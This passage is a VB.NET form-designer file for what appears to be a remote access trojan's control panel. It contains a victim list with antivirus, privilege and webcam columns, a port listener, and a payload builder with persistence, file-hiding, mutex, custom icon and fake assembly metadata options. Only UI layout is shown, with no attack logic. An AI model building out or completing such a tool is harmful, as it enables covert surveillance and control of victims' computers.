        Me.IL_CountryFlags.Images.SetKeyName(213, "tm.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(214, "tn.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(215, "to.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(216, "tr.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(217, "tt.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(218, "tv.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(219, "tw.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(220, "tz.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(221, "ua.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(222, "ug.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(223, "um.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(224, "us.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(225, "uy.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(226, "uz.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(227, "va.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(228, "vc.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(229, "ve.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(230, "vg.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(231, "vi.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(232, "vn.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(233, "vu.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(234, "wf.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(235, "ws.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(236, "ye.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(237, "yt.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(238, "za.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(239, "zm.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(240, "zw.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(241, "question.bmp")
        '
        'Tabcontrol1
        '
        Me.Tabcontrol1.Alignment = System.Windows.Forms.TabAlignment.Left
        Me.Tabcontrol1.Controls.Add(Me.LV_Clientdds)
        Me.Tabcontrol1.Controls.Add(Me.TP_Settings)
        Me.Tabcontrol1.Controls.Add(Me.TC_Builder)
        Me.Tabcontrol1.Controls.Add(Me.TP_Logs)
        Me.Tabcontrol1.Controls.Add(Me.TP_OnConnect)
        Me.Tabcontrol1.Controls.Add(Me.TP_Thumbnail)
        Me.Tabcontrol1.Controls.Add(Me.TC_Other)
        Me.Tabcontrol1.Controls.Add(Me.TC_Statistics)
        Me.Tabcontrol1.Controls.Add(Me.TabPage9)
        Me.Tabcontrol1.Controls.Add(Me.TabPage10)
        Me.Tabcontrol1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Tabcontrol1.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed
        Me.Tabcontrol1.Font = New System.Drawing.Font("Segoe UI", 10.0!)
        Me.Tabcontrol1.ImageList = Me.IL_TabControl
        Me.Tabcontrol1.ItemSize = New System.Drawing.Size(40, 150)
        Me.Tabcontrol1.Location = New System.Drawing.Point(0, 0)
        Me.Tabcontrol1.Multiline = True
        Me.Tabcontrol1.Name = "Tabcontrol1"
        Me.Tabcontrol1.SelectedIndex = 0
        Me.Tabcontrol1.SelectedItemColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(10, Byte), Integer), CType(CType(100, Byte), Integer), CType(CType(200, Byte), Integer))
        Me.Tabcontrol1.Size = New System.Drawing.Size(1031, 434)
        Me.Tabcontrol1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.Tabcontrol1.TabIndex = 1
        '
        'LV_Clientdds
        '
        Me.LV_Clientdds.Controls.Add(Me.LV_Clients)
        Me.LV_Clientdds.Location = New System.Drawing.Point(154, 4)
        Me.LV_Clientdds.Name = "LV_Clientdds"
        Me.LV_Clientdds.Padding = New System.Windows.Forms.Padding(3)
        Me.LV_Clientdds.Size = New System.Drawing.Size(873, 426)
        Me.LV_Clientdds.TabIndex = 0
        Me.LV_Clientdds.Text = "Clients"
        Me.LV_Clientdds.UseVisualStyleBackColor = True
        '
        'LV_Clients
        '
        Me.LV_Clients.Columns.AddRange(New Object() {Me.LVCH_Location, Me.LVCH_IP, Me.LVCH_Port, Me.LVCH_ClientID, Me.LVCH_UserName, Me.LVCH_ComputerName, Me.LVCH_OS, Me.LVCH_OsVersion, Me.LVCH_AV, Me.LVCH_Privilegs, Me.LVCH_Webcam, Me.LVCH_Ping})
        Me.LV_Clients.ContextMenuStrip = Me.CM_Clients
        Me.LV_Clients.Dock = System.Windows.Forms.DockStyle.Fill
        Me.LV_Clients.ImageList = Me.IL_CountryFlags
        Me.LV_Clients.Location = New System.Drawing.Point(3, 3)
        Me.LV_Clients.Name = "LV_Clients"
        Me.LV_Clients.Size = New System.Drawing.Size(867, 420)
        Me.LV_Clients.TabIndex = 0
        '
        'TP_Settings
        '
        Me.TP_Settings.Controls.Add(Me.GroupBox1)
        Me.TP_Settings.Location = New System.Drawing.Point(154, 4)
        Me.TP_Settings.Name = "TP_Settings"
        Me.TP_Settings.Padding = New System.Windows.Forms.Padding(3)
        Me.TP_Settings.Size = New System.Drawing.Size(873, 426)
        Me.TP_Settings.TabIndex = 1
        Me.TP_Settings.Text = "Settings"
        Me.TP_Settings.UseVisualStyleBackColor = True
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.LV_Ports)
        Me.GroupBox1.Controls.Add(Me.cb_sound)
        Me.GroupBox1.Controls.Add(Me.cb_notify)
        Me.GroupBox1.Controls.Add(Me.cb_autolisten)
        Me.GroupBox1.Controls.Add(Me.btn_stoplistening)
        Me.GroupBox1.Controls.Add(Me.btn_startlistening)
        Me.GroupBox1.Location = New System.Drawing.Point(12, 8)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(366, 185)
        Me.GroupBox1.TabIndex = 0
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Connection"
        '
        'LV_Ports
        '
        Me.LV_Ports.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.CH_Port, Me.CH_Status})
        Me.LV_Ports.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable
        ListViewItem1.UseItemStyleForSubItems = False
        Me.LV_Ports.Items.AddRange(New System.Windows.Forms.ListViewItem() {ListViewItem1})
        Me.LV_Ports.LabelEdit = True
        Me.LV_Ports.Location = New System.Drawing.Point(6, 25)
        Me.LV_Ports.Name = "LV_Ports"
        Me.LV_Ports.Size = New System.Drawing.Size(354, 61)
        Me.LV_Ports.TabIndex = 6
        Me.LV_Ports.UseCompatibleStateImageBehavior = False
        Me.LV_Ports.View = System.Windows.Forms.View.Details
        '
        'CH_Port
        '
        Me.CH_Port.Text = "Port"
        Me.CH_Port.Width = 111
        '
        'CH_Status
        '
        Me.CH_Status.Text = "Status"
        Me.CH_Status.Width = 182
        '
        'cb_sound
        '
        Me.cb_sound.AutoSize = True
        Me.cb_sound.Location = New System.Drawing.Point(187, 156)
        Me.cb_sound.Name = "cb_sound"
        Me.cb_sound.Size = New System.Drawing.Size(96, 23)
        Me.cb_sound.TabIndex = 5
        Me.cb_sound.Text = "Play Sound"
        Me.cb_sound.UseVisualStyleBackColor = True
        '
        'cb_notify
        '
        Me.cb_notify.AutoSize = True
        Me.cb_notify.Location = New System.Drawing.Point(6, 156)
        Me.cb_notify.Name = "cb_notify"
        Me.cb_notify.Size = New System.Drawing.Size(135, 23)
        Me.cb_notify.TabIndex = 4
        Me.cb_notify.Text = "Show Notification"
        Me.cb_notify.UseVisualStyleBackColor = True
        '
        'cb_autolisten
        '
        Me.cb_autolisten.AutoSize = True
        Me.cb_autolisten.Location = New System.Drawing.Point(6, 128)
        Me.cb_autolisten.Name = "cb_autolisten"
        Me.cb_autolisten.Size = New System.Drawing.Size(161, 23)
        Me.cb_autolisten.TabIndex = 3
        Me.cb_autolisten.Text = "Enable Auto Listening"
        Me.cb_autolisten.UseVisualStyleBackColor = True
        '
        'btn_stoplistening
        '
        Me.btn_stoplistening.Enabled = False
        Me.btn_stoplistening.Image = CType(resources.GetObject("btn_stoplistening.Image"), System.Drawing.Image)
        Me.btn_stoplistening.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btn_stoplistening.Location = New System.Drawing.Point(187, 92)
        Me.btn_stoplistening.Name = "btn_stoplistening"
        Me.btn_stoplistening.Size = New System.Drawing.Size(173, 30)
        Me.btn_stoplistening.TabIndex = 2
        Me.btn_stoplistening.Text = "Stop Listening"
        Me.btn_stoplistening.UseVisualStyleBackColor = True
        '
        'btn_startlistening
        '
        Me.btn_startlistening.Image = CType(resources.GetObject("btn_startlistening.Image"), System.Drawing.Image)
        Me.btn_startlistening.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btn_startlistening.Location = New System.Drawing.Point(6, 92)
        Me.btn_startlistening.Name = "btn_startlistening"
        Me.btn_startlistening.Size = New System.Drawing.Size(173, 30)
        Me.btn_startlistening.TabIndex = 1
        Me.btn_startlistening.Text = "Start Listening"
        Me.btn_startlistening.UseVisualStyleBackColor = True
        '
        'TC_Builder
        '
        Me.TC_Builder.Controls.Add(Me.TabControl12222)
        Me.TC_Builder.Location = New System.Drawing.Point(154, 4)
        Me.TC_Builder.Name = "TC_Builder"
        Me.TC_Builder.Size = New System.Drawing.Size(873, 426)
        Me.TC_Builder.TabIndex = 2
        Me.TC_Builder.Text = "Builder"
        Me.TC_Builder.UseVisualStyleBackColor = True
        '
        'TabControl12222
        '
        Me.TabControl12222.Controls.Add(Me.TabPage1)
        Me.TabControl12222.Controls.Add(Me.TabPage2)
        Me.TabControl12222.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TabControl12222.Location = New System.Drawing.Point(0, 0)
        Me.TabControl12222.Name = "TabControl12222"
        Me.TabControl12222.SelectedIndex = 0
        Me.TabControl12222.Size = New System.Drawing.Size(873, 426)
        Me.TabControl12222.TabIndex = 0
        '
        'TabPage1
        '
        Me.TabPage1.Controls.Add(Me.GroupBox4)
        Me.TabPage1.Controls.Add(Me.GroupBox3)
        Me.TabPage1.Controls.Add(Me.GroupBox2)
        Me.TabPage1.Location = New System.Drawing.Point(4, 26)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(865, 396)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.UseVisualStyleBackColor = True
        '
        'GroupBox4
        '
        Me.GroupBox4.Controls.Add(Me.Label5)
        Me.GroupBox4.Controls.Add(Me.NumericUpDown1)
        Me.GroupBox4.Controls.Add(Me.CheckBox7)
        Me.GroupBox4.Controls.Add(Me.CheckBox5)
        Me.GroupBox4.Controls.Add(Me.CheckBox3)
        Me.GroupBox4.Controls.Add(Me.CheckBox6)
        Me.GroupBox4.Controls.Add(Me.TextBox3)
        Me.GroupBox4.Controls.Add(Me.CheckBox2)
        Me.GroupBox4.Controls.Add(Me.TextBox2)
        Me.GroupBox4.Controls.Add(Me.Label4)
        Me.GroupBox4.Controls.Add(Me.TextBox1)
        Me.GroupBox4.Controls.Add(Me.RadioButton3)
        Me.GroupBox4.Controls.Add(Me.RadioButton2)
        Me.GroupBox4.Controls.Add(Me.RadioButton1)
        Me.GroupBox4.Controls.Add(Me.Label3)
        Me.GroupBox4.Controls.Add(Me.CheckBox1)
        Me.GroupBox4.Location = New System.Drawing.Point(14, 170)
        Me.GroupBox4.Name = "GroupBox4"
        Me.GroupBox4.Size = New System.Drawing.Size(845, 199)
        Me.GroupBox4.TabIndex = 2
        Me.GroupBox4.TabStop = False
        Me.GroupBox4.Text = "Persistence"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(512, 143)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(62, 19)
        Me.Label5.TabIndex = 18
        Me.Label5.Text = "Seconds."
        '
        'NumericUpDown1
        '
        Me.NumericUpDown1.Enabled = False
        Me.NumericUpDown1.Location = New System.Drawing.Point(373, 141)
        Me.NumericUpDown1.Name = "NumericUpDown1"
        Me.NumericUpDown1.Size = New System.Drawing.Size(129, 25)
        Me.NumericUpDown1.TabIndex = 17
        '
        'CheckBox7
        '
        Me.CheckBox7.AutoSize = True
        Me.CheckBox7.Location = New System.Drawing.Point(236, 141)
        Me.CheckBox7.Name = "CheckBox7"
        Me.CheckBox7.Size = New System.Drawing.Size(131, 23)
        Me.CheckBox7.TabIndex = 16
        Me.CheckBox7.Text = "Delay Execution :"
        Me.CheckBox7.UseVisualStyleBackColor = True
        '
        'CheckBox5
        '
        Me.CheckBox5.AutoSize = True
        Me.CheckBox5.Location = New System.Drawing.Point(150, 141)
        Me.CheckBox5.Name = "CheckBox5"
        Me.CheckBox5.Size = New System.Drawing.Size(80, 23)
        Me.CheckBox5.TabIndex = 15
        Me.CheckBox5.Text = "Hide File"
        Me.CheckBox5.UseVisualStyleBackColor = True
        '
        'CheckBox3
        '
        Me.CheckBox3.AutoSize = True
        Me.CheckBox3.Location = New System.Drawing.Point(11, 141)
        Me.CheckBox3.Name = "CheckBox3"
        Me.CheckBox3.Size = New System.Drawing.Size(133, 23)
        Me.CheckBox3.TabIndex = 14
        Me.CheckBox3.Text = "Add to AutoStart"
        Me.CheckBox3.UseVisualStyleBackColor = True
        '
        'CheckBox6
        '
        Me.CheckBox6.AutoSize = True
        Me.CheckBox6.Location = New System.Drawing.Point(741, 99)
        Me.CheckBox6.Name = "CheckBox6"
        Me.CheckBox6.Size = New System.Drawing.Size(98, 23)
        Me.CheckBox6.TabIndex = 13
        Me.CheckBox6.Text = "Hide Folder"
        Me.CheckBox6.UseVisualStyleBackColor = True
        '
        'TextBox3
        '
        Me.TextBox3.Enabled = False
        Me.TextBox3.Location = New System.Drawing.Point(501, 98)
        Me.TextBox3.Name = "TextBox3"
        Me.TextBox3.Size = New System.Drawing.Size(234, 25)
        Me.TextBox3.TabIndex = 12
        '
        'CheckBox2
        '
        Me.CheckBox2.AutoSize = True
        Me.CheckBox2.Location = New System.Drawing.Point(359, 99)
        Me.CheckBox2.Name = "CheckBox2"
        Me.CheckBox2.Size = New System.Drawing.Size(143, 23)
        Me.CheckBox2.TabIndex = 11
        Me.CheckBox2.Text = "Drop in Subfolder :"
        Me.CheckBox2.UseVisualStyleBackColor = True
        '
        'TextBox2
        '
        Me.TextBox2.Location = New System.Drawing.Point(142, 98)
        Me.TextBox2.Name = "TextBox2"
        Me.TextBox2.Size = New System.Drawing.Size(208, 25)
        Me.TextBox2.TabIndex = 10
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(7, 101)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(134, 19)
        Me.Label4.TabIndex = 9
        Me.Label4.Text = "Dropped File Name :"
        '
        'TextBox1
        '
        Me.TextBox1.Enabled = False
        Me.TextBox1.Location = New System.Drawing.Point(346, 53)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(493, 25)
        Me.TextBox1.TabIndex = 8
        '
        'RadioButton3
        '
        Me.RadioButton3.AutoSize = True
        Me.RadioButton3.Enabled = False
        Me.RadioButton3.Location = New System.Drawing.Point(236, 53)
        Me.RadioButton3.Name = "RadioButton3"
        Me.RadioButton3.Size = New System.Drawing.Size(114, 23)
        Me.RadioButton3.TabIndex = 7
        Me.RadioButton3.TabStop = True
        Me.RadioButton3.Text = "Costum Path :"
        Me.RadioButton3.UseVisualStyleBackColor = True
        '
        'RadioButton2
        '
        Me.RadioButton2.AutoSize = True
        Me.RadioButton2.Enabled = False
        Me.RadioButton2.Location = New System.Drawing.Point(149, 53)
        Me.RadioButton2.Name = "RadioButton2"
        Me.RadioButton2.Size = New System.Drawing.Size(81, 23)
        Me.RadioButton2.TabIndex = 6
        Me.RadioButton2.TabStop = True
        Me.RadioButton2.Text = "AppData"
        Me.RadioButton2.UseVisualStyleBackColor = True
        '
        'RadioButton1
        '
        Me.RadioButton1.AutoSize = True
        Me.RadioButton1.Enabled = False
        Me.RadioButton1.Location = New System.Drawing.Point(82, 53)
        Me.RadioButton1.Name = "RadioButton1"
        Me.RadioButton1.Size = New System.Drawing.Size(61, 23)
        Me.RadioButton1.TabIndex = 5
        Me.RadioButton1.TabStop = True
        Me.RadioButton1.Text = "Temp"
        Me.RadioButton1.UseVisualStyleBackColor = True
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(7, 53)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(69, 19)
        Me.Label3.TabIndex = 4
        Me.Label3.Text = "Install to :"
        '
        'CheckBox1
        '
        Me.CheckBox1.AutoSize = True
        Me.CheckBox1.Location = New System.Drawing.Point(11, 24)
        Me.CheckBox1.Name = "CheckBox1"
        Me.CheckBox1.Size = New System.Drawing.Size(139, 23)
        Me.CheckBox1.TabIndex = 0
        Me.CheckBox1.Text = "Enable Installation"
        Me.CheckBox1.UseVisualStyleBackColor = True
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.RandomPool1)
        Me.GroupBox3.Controls.Add(Me.TB_Mutex)
        Me.GroupBox3.Location = New System.Drawing.Point(319, 19)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(540, 135)
        Me.GroupBox3.TabIndex = 1
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Mutex"
        '
        'RandomPool1
        '
        Me.RandomPool1.Image = Nothing
        Me.RandomPool1.Location = New System.Drawing.Point(6, 55)
        Me.RandomPool1.Name = "RandomPool1"
        Me.RandomPool1.NoRounding = False
        Me.RandomPool1.Range = "0123456789!§$%&/()=?*+~#'-_<>|^°ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Me.RandomPool1.RangePadding = 2
        Me.RandomPool1.Size = New System.Drawing.Size(520, 74)
        Me.RandomPool1.TabIndex = 3
        Me.RandomPool1.Text = "RandomPool1"
        '
        'TB_Mutex
        '
        Me.TB_Mutex.Location = New System.Drawing.Point(6, 24)
        Me.TB_Mutex.Name = "TB_Mutex"
        Me.TB_Mutex.Size = New System.Drawing.Size(520, 25)
        Me.TB_Mutex.TabIndex = 2
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.tb_clientid)
        Me.GroupBox2.Controls.Add(Me.Label2)
        Me.GroupBox2.Controls.Add(Me.nud_port)
        Me.GroupBox2.Controls.Add(Me.tb_ip)
        Me.GroupBox2.Controls.Add(Me.Label1)
        Me.GroupBox2.Location = New System.Drawing.Point(6, 19)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(307, 135)
        Me.GroupBox2.TabIndex = 0
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Connection"
        '
        'tb_clientid
        '
        Me.tb_clientid.Location = New System.Drawing.Point(75, 87)
        Me.tb_clientid.Name = "tb_clientid"
        Me.tb_clientid.Size = New System.Drawing.Size(225, 25)
        Me.tb_clientid.TabIndex = 4
        Me.tb_clientid.Text = "Default"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(7, 90)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(69, 19)
        Me.Label2.TabIndex = 3
        Me.Label2.Text = "Client ID :"
        '
        'nud_port
        '
        Me.nud_port.Location = New System.Drawing.Point(233, 53)
        Me.nud_port.Maximum = New Decimal(New Integer() {9999, 0, 0, 0})
        Me.nud_port.Name = "nud_port"
        Me.nud_port.Size = New System.Drawing.Size(68, 25)
        Me.nud_port.TabIndex = 2
        Me.nud_port.Value = New Decimal(New Integer() {4431, 0, 0, 0})
        '
        'tb_ip
        '
        Me.tb_ip.Location = New System.Drawing.Point(11, 53)
        Me.tb_ip.Name = "tb_ip"
        Me.tb_ip.Size = New System.Drawing.Size(216, 25)
        Me.tb_ip.TabIndex = 1
        Me.tb_ip.Text = "127.0.0.1"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(7, 31)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(229, 19)
        Me.Label1.TabIndex = 0
        Me.Label1.Text = "IP-Addres or Host-Name with port :"
        '
        'TabPage2
        '
        Me.TabPage2.AllowDrop = True
        Me.TabPage2.Controls.Add(Me.LinkLabel1)
        Me.TabPage2.Controls.Add(Me.Button1)
        Me.TabPage2.Controls.Add(Me.CheckBox8)
        Me.TabPage2.Controls.Add(Me.GroupBox7)
        Me.TabPage2.Controls.Add(Me.GroupBox6)
        Me.TabPage2.Controls.Add(Me.GroupBox5)
        Me.TabPage2.Location = New System.Drawing.Point(4, 26)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(865, 395)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.UseVisualStyleBackColor = True
        '
        'LinkLabel1
        '
        Me.LinkLabel1.AutoSize = True
        Me.LinkLabel1.LinkColor = System.Drawing.Color.Black
        Me.LinkLabel1.Location = New System.Drawing.Point(227, 42)
        Me.LinkLabel1.Name = "LinkLabel1"
        Me.LinkLabel1.Size = New System.Drawing.Size(65, 19)
        Me.LinkLabel1.TabIndex = 5
        Me.LinkLabel1.TabStop = True
        Me.LinkLabel1.Text = "Generate"
        '
        'Button1
        '
        Me.Button1.Image = CType(resources.GetObject("Button1.Image"), System.Drawing.Image)
        Me.Button1.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.Button1.Location = New System.Drawing.Point(735, 304)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(111, 31)
        Me.Button1.TabIndex = 4
        Me.Button1.Text = "Compile"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'CheckBox8
        '
        Me.CheckBox8.AutoSize = True
        Me.CheckBox8.Location = New System.Drawing.Point(307, 308)
        Me.CheckBox8.Name = "CheckBox8"
        Me.CheckBox8.Size = New System.Drawing.Size(222, 23)
        Me.CheckBox8.TabIndex = 3
        Me.CheckBox8.Text = "By compiling I agree to the TOS"
        Me.CheckBox8.UseVisualStyleBackColor = True
        '
        'GroupBox7
        '
        Me.GroupBox7.Controls.Add(Me.rtb_output)
        Me.GroupBox7.Location = New System.Drawing.Point(516, 55)
        Me.GroupBox7.Name = "GroupBox7"
        Me.GroupBox7.Size = New System.Drawing.Size(330, 245)
        Me.GroupBox7.TabIndex = 2
        Me.GroupBox7.TabStop = False
        Me.GroupBox7.Text = "Console"
        '
        'rtb_output
        '
        Me.rtb_output.Location = New System.Drawing.Point(6, 24)
        Me.rtb_output.Name = "rtb_output"
        Me.rtb_output.Size = New System.Drawing.Size(318, 215)
        Me.rtb_output.TabIndex = 0
        Me.rtb_output.Text = ""
        '
        'GroupBox6
        '
        Me.GroupBox6.Controls.Add(Me.PictureBox1)
        Me.GroupBox6.Location = New System.Drawing.Point(298, 55)
        Me.GroupBox6.Name = "GroupBox6"
        Me.GroupBox6.Size = New System.Drawing.Size(212, 245)
        Me.GroupBox6.TabIndex = 1
        Me.GroupBox6.TabStop = False
        Me.GroupBox6.Text = "Drag && Drop Icon here"
        '
        'PictureBox1
        '
        Me.PictureBox1.Image = CType(resources.GetObject("PictureBox1.Image"), System.Drawing.Image)
        Me.PictureBox1.Location = New System.Drawing.Point(6, 24)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(200, 215)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 0
        Me.PictureBox1.TabStop = False
        '
        'GroupBox5
        '
        Me.GroupBox5.Controls.Add(Me.NumericUpDown8)
        Me.GroupBox5.Controls.Add(Me.NumericUpDown7)
        Me.GroupBox5.Controls.Add(Me.NumericUpDown6)
        Me.GroupBox5.Controls.Add(Me.NumericUpDown5)
        Me.GroupBox5.Controls.Add(Me.Label13)
        Me.GroupBox5.Controls.Add(Me.NumericUpDown4)
        Me.GroupBox5.Controls.Add(Me.NumericUpDown3)
        Me.GroupBox5.Controls.Add(Me.NumericUpDown2)
        Me.GroupBox5.Controls.Add(Me.NumericUpDown9)
        Me.GroupBox5.Controls.Add(Me.Label12)
        Me.GroupBox5.Controls.Add(Me.tb_assemblytrademark)
        Me.GroupBox5.Controls.Add(Me.Label11)
        Me.GroupBox5.Controls.Add(Me.tb_assemblycopyright)
        Me.GroupBox5.Controls.Add(Me.Label10)
        Me.GroupBox5.Controls.Add(Me.tb_assemblyproduct)
        Me.GroupBox5.Controls.Add(Me.Label9)
        Me.GroupBox5.Controls.Add(Me.tb_assemblycompany)
        Me.GroupBox5.Controls.Add(Me.Label8)
        Me.GroupBox5.Controls.Add(Me.tb_assemblydescription)
        Me.GroupBox5.Controls.Add(Me.Label7)
        Me.GroupBox5.Controls.Add(Me.tb_assemblytitle)
        Me.GroupBox5.Controls.Add(Me.Label6)
        Me.GroupBox5.Location = New System.Drawing.Point(12, 55)
        Me.GroupBox5.Name = "GroupBox5"
        Me.GroupBox5.Size = New System.Drawing.Size(279, 276)
        Me.GroupBox5.TabIndex = 0
        Me.GroupBox5.TabStop = False
        Me.GroupBox5.Text = "Assembly"
        '
        'NumericUpDown8
        '
        Me.NumericUpDown8.Location = New System.Drawing.Point(229, 245)
        Me.NumericUpDown8.Maximum = New Decimal(New Integer() {999, 0, 0, 0})
        Me.NumericUpDown8.Name = "NumericUpDown8"
        Me.NumericUpDown8.Size = New System.Drawing.Size(44, 25)
        Me.NumericUpDown8.TabIndex = 21
        '
        'NumericUpDown7
        '
        Me.NumericUpDown7.Location = New System.Drawing.Point(181, 245)
        Me.NumericUpDown7.Maximum = New Decimal(New Integer() {999, 0, 0, 0})
        Me.NumericUpDown7.Name = "NumericUpDown7"
        Me.NumericUpDown7.Size = New System.Drawing.Size(44, 25)
        Me.NumericUpDown7.TabIndex = 20
        '
        'NumericUpDown6
        '
        Me.NumericUpDown6.Location = New System.Drawing.Point(134, 245)
        Me.NumericUpDown6.Maximum = New Decimal(New Integer() {999, 0, 0, 0})
        Me.NumericUpDown6.Name = "NumericUpDown6"
        Me.NumericUpDown6.Size = New System.Drawing.Size(44, 25)
        Me.NumericUpDown6.TabIndex = 19
        '
        'NumericUpDown5
        '
        Me.NumericUpDown5.Location = New System.Drawing.Point(87, 245)
        Me.NumericUpDown5.Maximum = New Decimal(New Integer() {999, 0, 0, 0})
        Me.NumericUpDown5.Name = "NumericUpDown5"
        Me.NumericUpDown5.Size = New System.Drawing.Size(44, 25)
        Me.NumericUpDown5.TabIndex = 18
        '
        'Label13
        '
        Me.Label13.AutoSize = True
        Me.Label13.Location = New System.Drawing.Point(8, 247)
        Me.Label13.Name = "Label13"
        Me.Label13.Size = New System.Drawing.Size(82, 19)
        Me.Label13.TabIndex = 17
        Me.Label13.Text = "File Version:"
        '
        'NumericUpDown4
        '
        Me.NumericUpDown4.Location = New System.Drawing.Point(229, 218)
        Me.NumericUpDown4.Maximum = New Decimal(New Integer() {999, 0, 0, 0})
        Me.NumericUpDown4.Name = "NumericUpDown4"
        Me.NumericUpDown4.Size = New System.Drawing.Size(44, 25)
        Me.NumericUpDown4.TabIndex = 16
        '
        'NumericUpDown3
        '
        Me.NumericUpDown3.Location = New System.Drawing.Point(181, 218)
        Me.NumericUpDown3.Maximum = New Decimal(New Integer() {999, 0, 0, 0})
        Me.NumericUpDown3.Name = "NumericUpDown3"
        Me.NumericUpDown3.Size = New System.Drawing.Size(44, 25)
        Me.NumericUpDown3.TabIndex = 15
        '
        'NumericUpDown2
        '
        Me.NumericUpDown2.Location = New System.Drawing.Point(134, 218)
        Me.NumericUpDown2.Maximum = New Decimal(New Integer() {999, 0, 0, 0})
        Me.NumericUpDown2.Name = "NumericUpDown2"
        Me.NumericUpDown2.Size = New System.Drawing.Size(44, 25)
        Me.NumericUpDown2.TabIndex = 14
        '
        'NumericUpDown9
        '
        Me.NumericUpDown9.Location = New System.Drawing.Point(87, 218)
        Me.NumericUpDown9.Maximum = New Decimal(New Integer() {999, 0, 0, 0})
        Me.NumericUpDown9.Name = "NumericUpDown9"
        Me.NumericUpDown9.Size = New System.Drawing.Size(44, 25)
        Me.NumericUpDown9.TabIndex = 13
        '
        'Label12
        '
        Me.Label12.AutoSize = True
        Me.Label12.Location = New System.Drawing.Point(8, 220)
        Me.Label12.Name = "Label12"
        Me.Label12.Size = New System.Drawing.Size(58, 19)
        Me.Label12.TabIndex = 12
        Me.Label12.Text = "Version:"
        '
        'tb_assemblytrademark
        '
        Me.tb_assemblytrademark.Location = New System.Drawing.Point(87, 179)
        Me.tb_assemblytrademark.Name = "tb_assemblytrademark"
        Me.tb_assemblytrademark.Size = New System.Drawing.Size(186, 25)
        Me.tb_assemblytrademark.TabIndex = 11
        '
        'Label11
        '
        Me.Label11.AutoSize = True
        Me.Label11.Location = New System.Drawing.Point(4, 182)
        Me.Label11.Name = "Label11"
        Me.Label11.Size = New System.Drawing.Size(77, 19)
        Me.Label11.TabIndex = 10
        Me.Label11.Text = "Trademark:"
        '
        'tb_assemblycopyright
        '
        Me.tb_assemblycopyright.Location = New System.Drawing.Point(87, 148)
        Me.tb_assemblycopyright.Name = "tb_assemblycopyright"
        Me.tb_assemblycopyright.Size = New System.Drawing.Size(186, 25)
        Me.tb_assemblycopyright.TabIndex = 9
        '
        'Label10
        '
